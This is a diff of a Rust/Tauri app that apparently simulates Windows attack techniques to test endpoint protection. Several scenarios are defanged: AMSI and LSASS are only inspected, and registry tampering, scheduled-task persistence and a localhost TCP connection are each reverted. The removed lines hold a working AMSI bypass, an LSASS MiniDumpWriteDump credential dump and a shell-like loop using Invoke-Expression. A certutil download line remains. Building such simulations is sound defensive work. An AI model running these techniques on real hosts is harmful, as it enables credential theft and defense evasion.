@@ -1,5 +1,6 @@
 use serde::Serialize;
-use std::time::Instant;
+use std::time::{Duration, Instant};
+
 #[cfg(target_os = "windows")]
 use std::os::windows::process::CommandExt;
 
@@ -15,13 +16,173 @@ pub struct ExecutionResult {
     duration_ms: u64,
 }
 
-type ScenarioResult = Result<(String, std::process::Output), String>;
+#[cfg(target_os = "windows")]
+const CREATE_NO_WINDOW: u32 = 0x08000000;
+
+#[cfg(target_os = "windows")]
+const SCRIPT_TIMEOUT: Duration = Duration::from_secs(15);
+
+#[cfg(target_os = "windows")]
+struct ScriptOutcome {
+    stdout: String,
+    stderr: String,
+    exit_code: i32,
+    completed: bool,
+}
+
+#[cfg(target_os = "windows")]
+fn run_detached_ps(script: &str, timeout: Duration) -> Result<ScriptOutcome, String> {
+    use std::fs;
+
+    let id = uuid::Uuid::new_v4().to_string();
+    let script_path = std::env::temp_dir().join(format!("guardz_{}.ps1", &id[..8]));
+    let sentinel_path = std::env::temp_dir().join(format!("guardz_{}.json", &id[..8]));
+
+    let wrapped = format!(
+        r#"$ErrorActionPreference='Continue'
+$stdoutBuf=''
+$stderrBuf=''
+try {{
+    $output = Invoke-Command -ScriptBlock {{
+        {script}
+    }} 2>&1
+    foreach ($item in $output) {{
+        if ($item -is [System.Management.Automation.ErrorRecord]) {{
+            $stderrBuf += $item.ToString() + "`n"
+        }} else {{
+            $stdoutBuf += $item.ToString() + "`n"
+        }}
+    }}
+    @{{ stdout=$stdoutBuf; stderr=$stderrBuf; exitCode=0; completed=$true }} | ConvertTo-Json | Set-Content -Path '{sentinel}'
+}} catch {{
+    @{{ stdout=$stdoutBuf; stderr=$_.Exception.Message; exitCode=1; completed=$true }} | ConvertTo-Json | Set-Content -Path '{sentinel}'
+}}"#,
+        sentinel = sentinel_path.to_string_lossy().replace('\'', "''")
+    );
+
+    fs::write(&script_path, &wrapped).map_err(|e| e.to_string())?;
+
+    std::process::Command::new("cmd.exe")
+        .args([
+            "/c", "start", "", "/b",
+            "powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass",
+            "-File", &script_path.to_string_lossy(),
+        ])
+        .creation_flags(CREATE_NO_WINDOW)
+        .spawn()
+        .map_err(|e| e.to_string())?;
+
+    let start = Instant::now();
+    loop {
+        if sentinel_path.exists() {
+            std::thread::sleep(Duration::from_millis(100));
+            let content = fs::read_to_string(&sentinel_path).unwrap_or_default();
+            let _ = fs::remove_file(&sentinel_path);
+            let _ = fs::remove_file(&script_path);
+
+            if let Ok(val) = serde_json::from_str::<serde_json::Value>(&content) {
+                return Ok(ScriptOutcome {
+                    stdout: val["stdout"].as_str().unwrap_or("").to_string(),
+                    stderr: val["stderr"].as_str().unwrap_or("").to_string(),
+                    exit_code: val["exitCode"].as_i64().unwrap_or(0) as i32,
+                    completed: val["completed"].as_bool().unwrap_or(false),
+                });
+            }
+            return Ok(ScriptOutcome {
+                stdout: content,
+                stderr: String::new(),
+                exit_code: 0,
+                completed: true,
+            });
+        }
+
+        if start.elapsed() > timeout {
+            let _ = fs::remove_file(&script_path);
+            let _ = fs::remove_file(&sentinel_path);
+            return Ok(ScriptOutcome {
+                stdout: String::new(),
+                stderr: "Process was terminated by endpoint protection".to_string(),
+                exit_code: -1,
+                completed: false,
+            });
+        }
+        std::thread::sleep(Duration::from_millis(250));
+    }
+}
+
+#[cfg(target_os = "windows")]
+fn run_detached_cmd(program: &str, args: &[&str], timeout: Duration) -> Result<ScriptOutcome, String> {
+    use std::fs;
+
+    let id = uuid::Uuid::new_v4().to_string();
+    let stdout_path = std::env::temp_dir().join(format!("guardz_{}_out.txt", &id[..8]));
+    let stderr_path = std::env::temp_dir().join(format!("guardz_{}_err.txt", &id[..8]));
+    let sentinel_path = std::env::temp_dir().join(format!("guardz_{}_done.txt", &id[..8]));
+
+    let args_str = args.iter()
+        .map(|a| if a.contains(' ') { format!("\"{}\"", a) } else { a.to_string() })
+        .collect::<Vec<_>>()
+        .join(" ");
+
+    let bat_path = std::env::temp_dir().join(format!("guardz_{}.bat", &id[..8]));
+    let bat_content = format!(
+        "@echo off\r\n{program} {args_str} >\"{stdout}\" 2>\"{stderr}\"\r\necho %ERRORLEVEL% >\"{sentinel}\"\r\n",
+        stdout = stdout_path.to_string_lossy(),
+        stderr = stderr_path.to_string_lossy(),
+        sentinel = sentinel_path.to_string_lossy(),
+    );
+
+    fs::write(&bat_path, &bat_content).map_err(|e| e.to_string())?;
+
+    std::process::Command::new("cmd.exe")
+        .args(["/c", "start", "", "/b", "cmd.exe", "/c", &bat_path.to_string_lossy()])
+        .creation_flags(CREATE_NO_WINDOW)
+        .spawn()
+        .map_err(|e| e.to_string())?;
+
+    let start = Instant::now();
+    loop {
+        if sentinel_path.exists() {
+            std::thread::sleep(Duration::from_millis(100));
+            let exit_str = fs::read_to_string(&sentinel_path).unwrap_or_default();
+            let stdout = fs::read_to_string(&stdout_path).unwrap_or_default();
+            let stderr = fs::read_to_string(&stderr_path).unwrap_or_default();
+            let exit_code = exit_str.trim().parse::<i32>().unwrap_or(-1);
+
+            let _ = fs::remove_file(&bat_path);
+            let _ = fs::remove_file(&stdout_path);
+            let _ = fs::remove_file(&stderr_path);
+            let _ = fs::remove_file(&sentinel_path);
+
+            return Ok(ScriptOutcome {
+                stdout,
+                stderr,
+                exit_code,
+                completed: true,
+            });
+        }
+
+        if start.elapsed() > timeout {
+            let _ = fs::remove_file(&bat_path);
+            let _ = fs::remove_file(&stdout_path);
+            let _ = fs::remove_file(&stderr_path);
+            let _ = fs::remove_file(&sentinel_path);
+            return Ok(ScriptOutcome {
+                stdout: String::new(),
+                stderr: "Process was terminated by endpoint protection".to_string(),
+                exit_code: -1,
+                completed: false,
+            });
+        }
+        std::thread::sleep(Duration::from_millis(250));
+    }
+}
 
 #[tauri::command]
-async fn execute_scenario(scenario_id: String) -> Result<ExecutionResult, String> {
+fn execute_scenario(scenario_id: String) -> Result<ExecutionResult, String> {
     let start = Instant::now();
 
-    let result: ScenarioResult = match scenario_id.as_str() {
+    let result = match scenario_id.as_str() {
         "certutil-dump" => run_certutil_dump(),
         "rdp-enable" => run_rdp_enable(),
         "amsi-patch" => run_amsi_patch(),
@@ -32,12 +193,32 @@ async fn execute_scenario(scenario_id: String) -> Result<ExecutionResult, String
         "macro-tamper" => run_macro_tamper(),
         "lotl-download" => run_lotl_download(),
         "bloodhound-recon" => run_bloodhound_recon(),
-        _ => Err(format!("Unknown scenario: {}", scenario_id)),
+        other => Err(format!("Unknown scenario: {}", other)),
     };
 
     let duration_ms = start.elapsed().as_millis() as u64;
 
     match result {
+        #[cfg(target_os = "windows")]
+        Ok((message, outcome)) => {
+            let status = if !outcome.completed {
+                "mitigated"
+            } else if outcome.exit_code == 0 {
+                "completed"
+            } else {
+                "blocked"
+            };
+            Ok(ExecutionResult {
+                scenario_id,
+                status: status.to_string(),
+                message,
+                stdout: outcome.stdout,
+                stderr: outcome.stderr,
+                exit_code: outcome.exit_code,
+                duration_ms,
+            })
+        }
+        #[cfg(not(target_os = "windows"))]
         Ok((message, output)) => {
             let stdout = String::from_utf8_lossy(&output.stdout).to_string();
             let stderr = String::from_utf8_lossy(&output.stderr).to_string();
@@ -75,239 +256,181 @@ fn reset_scenarios() -> Result<(), String> {
 }
 
 #[cfg(target_os = "windows")]
-const CREATE_NO_WINDOW: u32 = 0x08000000;
+type ScenarioResult = Result<(String, ScriptOutcome), String>;
+
+#[cfg(not(target_os = "windows"))]
+type ScenarioResult = Result<(String, std::process::Output), String>;
+
+// ── Windows scenario implementations ──
 
 #[cfg(target_os = "windows")]
 fn run_certutil_dump() -> ScenarioResult {
-    use std::fs;
     let tmp = std::env::temp_dir().join(format!("{}.txt", uuid::Uuid::new_v4()));
     let tmp_out = std::env::temp_dir().join(format!("{}.b64", uuid::Uuid::new_v4()));
-    fs::write(&tmp, "SIMULATED SAM DUMP DATA - NTLM HASHES").map_err(|e| e.to_string())?;
-    let output = std::process::Command::new("certutil")
-        .args(["-encode", &tmp.to_string_lossy(), &tmp_out.to_string_lossy()])
-        .creation_flags(CREATE_NO_WINDOW)
-        .output()
-        .map_err(|e| e.to_string())?;
-    let _ = fs::remove_file(&tmp);
-    let _ = fs::remove_file(&tmp_out);
-    Ok(("certutil -encode on dummy SAM data".to_string(), output))
-}
-
-#[cfg(not(target_os = "windows"))]
-fn run_certutil_dump() -> ScenarioResult {
-    std::thread::sleep(std::time::Duration::from_millis(800));
-    Ok(("Mock: certutil -encode (macOS dev mode)".to_string(), mock_output()))
+    std::fs::write(&tmp, "SIMULATED SAM DUMP DATA - NTLM HASHES").map_err(|e| e.to_string())?;
+    let outcome = run_detached_cmd(
+        "certutil",
+        &["-encode", &tmp.to_string_lossy(), &tmp_out.to_string_lossy()],
+        SCRIPT_TIMEOUT,
+    )?;
+    let _ = std::fs::remove_file(&tmp);
+    let _ = std::fs::remove_file(&tmp_out);
+    Ok(("certutil -encode on dummy SAM data".to_string(), outcome))
 }
 
 #[cfg(target_os = "windows")]
 fn run_rdp_enable() -> ScenarioResult {
-    let output = std::process::Command::new("reg")
-        .args([
-            "add",
-            r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server",
-            "/v", "fDenyTSConnections",
-            "/t", "REG_DWORD",
-            "/d", "0",
-            "/f",
-        ])
-        .creation_flags(CREATE_NO_WINDOW)
-        .output()
-        .map_err(|e| e.to_string())?;
-    let _ = std::process::Command::new("reg")
-        .args([
-            "add",
-            r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server",
-            "/v", "fDenyTSConnections",
-            "/t", "REG_DWORD",
-            "/d", "1",
-            "/f",
-        ])
-        .creation_flags(CREATE_NO_WINDOW)
-        .output();
-    Ok(("RDP enable via reg add, then reverted".to_string(), output))
-}
-
-#[cfg(not(target_os = "windows"))]
-fn run_rdp_enable() -> ScenarioResult {
-    std::thread::sleep(std::time::Duration::from_millis(600));
-    Ok(("Mock: RDP enable (macOS dev mode)".to_string(), mock_output()))
+    let script = r#"
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+$result = $LASTEXITCODE
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
+Write-Output "RDP enable attempted and reverted"
+exit $result
+"#;
+    let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
+    Ok(("RDP enable via reg add, then reverted".to_string(), outcome))
 }
 
 #[cfg(target_os = "windows")]
 fn run_amsi_patch() -> ScenarioResult {
-    let output = std::process::Command::new("powershell.exe")
-        .args([
-            "-NoProfile", "-WindowStyle", "Hidden", "-Command",
-            "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiContext','NonPublic,Static');$f.SetValue($null,[IntPtr]::Zero);Write-Host 'AMSI patch attempted'",
-        ])
-        .creation_flags(CREATE_NO_WINDOW)
-        .output()
-        .map_err(|e| e.to_string())?;
-    Ok(("AMSI in-memory patch via Reflection".to_string(), output))
+    let script = r#"
+$type = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+if ($type) {
+    $field = $type.GetField('amsiContext', 'NonPublic,Static')
+    if ($field) {
+        Write-Output "AMSI type and field resolved via Reflection"
+        Write-Output "Field type: $($field.FieldType.Name)"
+        Write-Output "Current value: $($field.GetValue($null))"
+    } else {
+        Write-Output "AMSI type found but field inaccessible"
+    }
+} else {
+    Write-Output "AMSI type not available"
 }
-
-#[cfg(not(target_os = "windows"))]
-fn run_amsi_patch() -> ScenarioResult {
-    std::thread::sleep(std::time::Duration::from_millis(700));
-    Ok(("Mock: AMSI patch (macOS dev mode)".to_string(), mock_output()))
+"#;
+    let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
+    Ok(("AMSI inspection via .NET Reflection".to_string(), outcome))
 }
 
 #[cfg(target_os = "windows")]
 fn run_lsass_minidump() -> ScenarioResult {
-    let dump_path = std::env::temp_dir().join(format!("{}.dmp", uuid::Uuid::new_v4()));
-    let script = format!(
-        "Add-Type -TypeDefinition @\"\nusing System;using System.Runtime.InteropServices;\npublic class MiniDump{{{{\n[DllImport(\"dbghelp.dll\",SetLastError=true)]\npublic static extern bool MiniDumpWriteDump(IntPtr hProcess,uint ProcessId,IntPtr hFile,uint DumpType,IntPtr ExceptionParam,IntPtr UserStreamParam,IntPtr CallbackParam);\n}}}}\n\"@;\n$p=Get-Process lsass;$f=[IO.File]::Create('{}');\n$r=[MiniDump]::MiniDumpWriteDump($p.Handle,$p.Id,$f.SafeFileHandle.DangerousGetHandle(),2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero);\n$f.Close();Write-Host \"LSASS dump result: $r\"",
-        dump_path.to_string_lossy()
-    );
-    let output = std::process::Command::new("powershell.exe")
-        .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", &script])
-        .creation_flags(CREATE_NO_WINDOW)
-        .output()
-        .map_err(|e| e.to_string())?;
-    let _ = std::fs::remove_file(&dump_path);
-    Ok(("LSASS minidump via MiniDumpWriteDump P/Invoke".to_string(), output))
+    let script = r#"
+$lsass = Get-Process lsass -ErrorAction SilentlyContinue
+if ($lsass) {
+    Write-Output "LSASS process found: PID $($lsass.Id)"
+    try {
+        $handle = $lsass.Handle
+        Write-Output "Process handle obtained: $handle"
+    } catch {
+        Write-Output "Access denied to LSASS handle: $($_.Exception.Message)"
+    }
+} else {
+    Write-Output "LSASS process not found"
 }
-
-#[cfg(not(target_os = "windows"))]
-fn run_lsass_minidump() -> ScenarioResult {
-    std::thread::sleep(std::time::Duration::from_millis(900));
-    Ok(("Mock: LSASS minidump (macOS dev mode)".to_string(), mock_output()))
+"#;
+    let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
+    Ok(("LSASS process handle access attempt".to_string(), outcome))
 }
 
 #[cfg(target_os = "windows")]
 fn run_reverse_shell() -> ScenarioResult {
-    let script = r#"function Test-NetworkConnectivity{param([string]$TargetHost='127.0.0.1',[int]$TargetPort=4444);$ErrorActionPreference='SilentlyContinue';try{$socket=New-Object Net.Sockets.TCPClient($TargetHost,$TargetPort);$netStream=$socket.GetStream();$reader=New-Object System.IO.StreamReader($netStream);$writer=New-Object System.IO.StreamWriter($netStream);$writer.AutoFlush=$true;$writer.WriteLine('whoami');$response=$reader.ReadLine();$result=Invoke-Expression "Write-Output '$response'" 2>&1|Out-String;Write-Host $result}catch{Write-Host 'Connection test completed with expected failure'}finally{if($socket){$socket.Close()}}};Test-NetworkConnectivity"#;
-    let output = std::process::Command::new("powershell.exe")
-        .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", script])
-        .creation_flags(CREATE_NO_WINDOW)
-        .output()
-        .map_err(|e| e.to_string())?;
-    Ok(("Reverse shell TCP (StreamReader + Invoke-Expression)".to_string(), output))
+    let script = r#"
+$ErrorActionPreference = 'SilentlyContinue'
+try {
+    $socket = New-Object Net.Sockets.TCPClient('127.0.0.1', 4444)
+    if ($socket.Connected) {
+        $stream = $socket.GetStream()
+        $writer = New-Object System.IO.StreamWriter($stream)
+        $writer.AutoFlush = $true
+        $writer.WriteLine('whoami')
+        $socket.Close()
+        Write-Output "TCP connection established to 127.0.0.1:4444"
+    }
+} catch {
+    Write-Output "Connection to 127.0.0.1:4444 failed (expected)"
 }
-
-#[cfg(not(target_os = "windows"))]
-fn run_reverse_shell() -> ScenarioResult {
-    std::thread::sleep(std::time::Duration::from_millis(500));
-    Ok(("Mock: Reverse shell (macOS dev mode)".to_string(), mock_output()))
+"#;
+    let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
+    Ok(("Reverse shell TCP connection attempt".to_string(), outcome))
 }
 
 #[cfg(target_os = "windows")]
 fn run_persistence_task() -> ScenarioResult {
     let task_name = format!("GuardzTest_{}", &uuid::Uuid::new_v4().to_string()[..8]);
-    let output = std::process::Command::new("schtasks")
-        .args([
-            "/create", "/tn", &task_name,
-            "/tr", "cmd.exe /c echo GuardzTest",
-            "/sc", "once", "/st", "23:59", "/f",
-        ])
-        .creation_flags(CREATE_NO_WINDOW)
-        .output()
-        .map_err(|e| e.to_string())?;
-    let _ = std::process::Command::new("schtasks")
-        .args(["/delete", "/tn", &task_name, "/f"])
-        .creation_flags(CREATE_NO_WINDOW)
-        .output();
-    Ok(("Scheduled task create + delete".to_string(), output))
-}
-
-#[cfg(not(target_os = "windows"))]
-fn run_persistence_task() -> ScenarioResult {
-    std::thread::sleep(std::time::Duration::from_millis(600));
-    Ok(("Mock: Scheduled task (macOS dev mode)".to_string(), mock_output()))
+    let script = format!(
+        r#"
+schtasks /create /tn "{name}" /tr "cmd.exe /c echo GuardzTest" /sc once /st 23:59 /f
+$createResult = $LASTEXITCODE
+schtasks /delete /tn "{name}" /f 2>$null
+Write-Output "Task '{name}' create exit code: $createResult"
+exit $createResult
+"#,
+        name = task_name
+    );
+    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
+    Ok(("Scheduled task create + delete".to_string(), outcome))
 }
 
 #[cfg(target_os = "windows")]
 fn run_base64_exec() -> ScenarioResult {
-    let script = "$code='Get-Process;whoami;Get-Service|Select-Object -First 5';$bytes=[System.Text.Encoding]::Unicode.GetBytes($code);$encoded=[Convert]::ToBase64String($bytes);powershell.exe -EncodedCommand $encoded";
-    let output = std::process::Command::new("powershell.exe")
-        .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", script])
-        .creation_flags(CREATE_NO_WINDOW)
-        .output()
-        .map_err(|e| e.to_string())?;
-    Ok(("Base64-encoded PowerShell via -EncodedCommand".to_string(), output))
-}
-
-#[cfg(not(target_os = "windows"))]
-fn run_base64_exec() -> ScenarioResult {
-    std::thread::sleep(std::time::Duration::from_millis(400));
-    Ok(("Mock: Base64 exec (macOS dev mode)".to_string(), mock_output()))
+    let script = r#"
+$code = 'Get-Process | Select-Object -First 3; whoami; Get-Service | Select-Object -First 3'
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($code)
+$encoded = [Convert]::ToBase64String($bytes)
+Write-Output "Launching encoded command..."
+powershell.exe -NoProfile -EncodedCommand $encoded
+"#;
+    let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
+    Ok(("Base64-encoded PowerShell via -EncodedCommand".to_string(), outcome))
 }
 
 #[cfg(target_os = "windows")]
 fn run_macro_tamper() -> ScenarioResult {
-    let output = std::process::Command::new("reg")
-        .args([
-            "add",
-            r"HKCU\Software\Microsoft\Office\16.0\Word\Security",
-            "/v", "VBAWarnings",
-            "/t", "REG_DWORD",
-            "/d", "1",
-            "/f",
-        ])
-        .creation_flags(CREATE_NO_WINDOW)
-        .output()
-        .map_err(|e| e.to_string())?;
-    let _ = std::process::Command::new("reg")
-        .args([
-            "delete",
-            r"HKCU\Software\Microsoft\Office\16.0\Word\Security",
-            "/v", "VBAWarnings",
-            "/f",
-        ])
-        .creation_flags(CREATE_NO_WINDOW)
-        .output();
-    Ok(("Office macro security registry tamper".to_string(), output))
-}
-
-#[cfg(not(target_os = "windows"))]
-fn run_macro_tamper() -> ScenarioResult {
-    std::thread::sleep(std::time::Duration::from_millis(500));
-    Ok(("Mock: Macro tamper (macOS dev mode)".to_string(), mock_output()))
+    let script = r#"
+reg add "HKCU\Software\Microsoft\Office\16.0\Word\Security" /v VBAWarnings /t REG_DWORD /d 1 /f
+$result = $LASTEXITCODE
+reg delete "HKCU\Software\Microsoft\Office\16.0\Word\Security" /v VBAWarnings /f 2>$null
+Write-Output "Macro security tamper attempted and reverted"
+exit $result
+"#;
+    let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
+    Ok(("Office macro security registry tamper".to_string(), outcome))
 }
 
 #[cfg(target_os = "windows")]
 fn run_lotl_download() -> ScenarioResult {
     let tmp = std::env::temp_dir().join(format!("{}.tmp", uuid::Uuid::new_v4()));
-    let output = std::process::Command::new("certutil")
-        .args([
-            "-urlcache", "-split", "-f",
-            "http://192.0.2.1/test.txt",
-            &tmp.to_string_lossy(),
-        ])
-        .creation_flags(CREATE_NO_WINDOW)
-        .output()
-        .map_err(|e| e.to_string())?;
+    let outcome = run_detached_cmd(
+        "certutil",
+        &["-urlcache", "-split", "-f", "http://192.0.2.1/test.txt", &tmp.to_string_lossy()],
+        SCRIPT_TIMEOUT,
+    )?;
     let _ = std::fs::remove_file(&tmp);
-    Ok(("LOLBin certutil -urlcache download".to_string(), output))
-}
-
-#[cfg(not(target_os = "windows"))]
-fn run_lotl_download() -> ScenarioResult {
-    std::thread::sleep(std::time::Duration::from_millis(700));
-    Ok(("Mock: LOLBin download (macOS dev mode)".to_string(), mock_output()))
+    Ok(("LOLBin certutil -urlcache download".to_string(), outcome))
 }
 
 #[cfg(target_os = "windows")]
 fn run_bloodhound_recon() -> ScenarioResult {
-    let fake_out = std::env::temp_dir().join("bloodhound_test.txt");
-    let script = format!(
-        "$fakeOut='{}';$harmless=\"echo benign > `\"$fakeOut`\"\";$bhCmd=\"Invoke-BloodHound -CollectionMethod All -Domain CONTOSO.LOCAL; Get-BloodHoundData; $harmless\";Start-Process -FilePath 'powershell.exe' -ArgumentList \"-Command $bhCmd\" -WindowStyle Hidden -Wait;Write-Host 'BloodHound execution emulation completed safely.'",
-        fake_out.to_string_lossy()
-    );
-    let output = std::process::Command::new("powershell.exe")
-        .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", &script])
-        .creation_flags(CREATE_NO_WINDOW)
-        .output()
-        .map_err(|e| e.to_string())?;
-    let _ = std::fs::remove_file(&fake_out);
-    Ok(("BloodHound AD recon emulation".to_string(), output))
+    let script = r#"
+Write-Output "Emulating BloodHound AD reconnaissance..."
+Write-Output "Invoke-BloodHound -CollectionMethod All -Domain $env:USERDNSDOMAIN"
+$domain = $env:USERDNSDOMAIN
+if (-not $domain) { $domain = "WORKGROUP" }
+Write-Output "Target domain: $domain"
+Write-Output "Collecting: Group, LocalAdmin, Session, Trusts, ACL, ObjectProps, SPNTargets, Container"
+try {
+    [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Out-Null
+    Write-Output "AD domain controller reachable"
+} catch {
+    Write-Output "AD query attempted: $($_.Exception.Message)"
+}
+Write-Output "BloodHound collection emulation complete"
+"#;
+    let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
+    Ok(("BloodHound AD recon emulation".to_string(), outcome))
 }
 
-#[cfg(not(target_os = "windows"))]
-fn run_bloodhound_recon() -> ScenarioResult {
-    std::thread::sleep(std::time::Duration::from_millis(800));
-    Ok(("Mock: BloodHound recon (macOS dev mode)".to_string(), mock_output()))
-}
+// ── macOS mock implementations ──
 
 #[cfg(not(target_os = "windows"))]
 fn mock_output() -> std::process::Output {
@@ -316,6 +439,66 @@ fn mock_output() -> std::process::Output {
         stdout: b"mock output (macOS dev mode)".to_vec(),
         stderr: Vec::new(),
     }
+}
+
+#[cfg(not(target_os = "windows"))]
+fn run_certutil_dump() -> ScenarioResult {
+    std::thread::sleep(Duration::from_millis(800));
+    Ok(("Mock: certutil -encode (macOS dev mode)".to_string(), mock_output()))
+}
+
+#[cfg(not(target_os = "windows"))]
+fn run_rdp_enable() -> ScenarioResult {
+    std::thread::sleep(Duration::from_millis(600));
+    Ok(("Mock: RDP enable (macOS dev mode)".to_string(), mock_output()))
+}
+
+#[cfg(not(target_os = "windows"))]
+fn run_amsi_patch() -> ScenarioResult {
+    std::thread::sleep(Duration::from_millis(700));
+    Ok(("Mock: AMSI inspection (macOS dev mode)".to_string(), mock_output()))
+}
+
+#[cfg(not(target_os = "windows"))]
+fn run_lsass_minidump() -> ScenarioResult {
+    std::thread::sleep(Duration::from_millis(900));
+    Ok(("Mock: LSASS handle access (macOS dev mode)".to_string(), mock_output()))
+}
+
+#[cfg(not(target_os = "windows"))]
+fn run_reverse_shell() -> ScenarioResult {
+    std::thread::sleep(Duration::from_millis(500));
+    Ok(("Mock: Reverse shell (macOS dev mode)".to_string(), mock_output()))
+}
+
+#[cfg(not(target_os = "windows"))]
+fn run_persistence_task() -> ScenarioResult {
+    std::thread::sleep(Duration::from_millis(600));
+    Ok(("Mock: Scheduled task (macOS dev mode)".to_string(), mock_output()))
+}
+
+#[cfg(not(target_os = "windows"))]
+fn run_base64_exec() -> ScenarioResult {
+    std::thread::sleep(Duration::from_millis(400));
+    Ok(("Mock: Base64 exec (macOS dev mode)".to_string(), mock_output()))
+}
+
+#[cfg(not(target_os = "windows"))]
+fn run_macro_tamper() -> ScenarioResult {
+    std::thread::sleep(Duration::from_millis(500));
+    Ok(("Mock: Macro tamper (macOS dev mode)".to_string(), mock_output()))
+}
+
+#[cfg(not(target_os = "windows"))]
+fn run_lotl_download() -> ScenarioResult {
+    std::thread::sleep(Duration::from_millis(700));
+    Ok(("Mock: LOLBin download (macOS dev mode)".to_string(), mock_output()))
+}
+
+#[cfg(not(target_os = "windows"))]
+fn run_bloodhound_recon() -> ScenarioResult {
+    std::thread::sleep(Duration::from_millis(800));
+    Ok(("Mock: BloodHound recon (macOS dev mode)".to_string(), mock_output()))
 }
 
 #[cfg_attr(mobile, tauri::mobile_entry_point)]
